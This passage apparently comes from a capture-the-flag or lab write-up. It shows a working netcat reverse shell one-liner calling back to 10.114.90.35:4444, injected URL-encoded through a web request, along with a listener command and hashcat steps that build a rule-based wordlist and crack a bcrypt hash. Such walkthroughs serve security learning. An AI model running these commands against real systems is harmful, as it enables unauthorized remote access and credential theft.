Time to inject a reverse shell payload here! Use online reverse shell generator. Took some time to find one that worked:

```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.114.90.35 4444 >/tmp/f
```

Started a listener using `nc -lvnp 4444` on attacker machine and injected the URL-encoded reverse shell as the payload in the URL.

<img width="1059" height="128" alt="Bildschirmfoto 2026-07-05 um 18 08 18" src="https://github.com/user-attachments/assets/67629423-00f6-4b3a-bbf3-9d01cc457552" />

We can take the string `Spring2026` and write it into a base text-file `base.txt`. Then we can use hashcat to transform this one string into a wordlist containing thousands of permutations/variations of the original string, using the following command:

```console
hashcat --stdout base.txt -r /usr/local/hashcat/rules/dive.rule > custom.txt
```

Using `hashcat -m 3200 hash.txt custom.txt`, where 3200 is the hashcat mode for bcrypt, I actually got a hit after a few minutes:
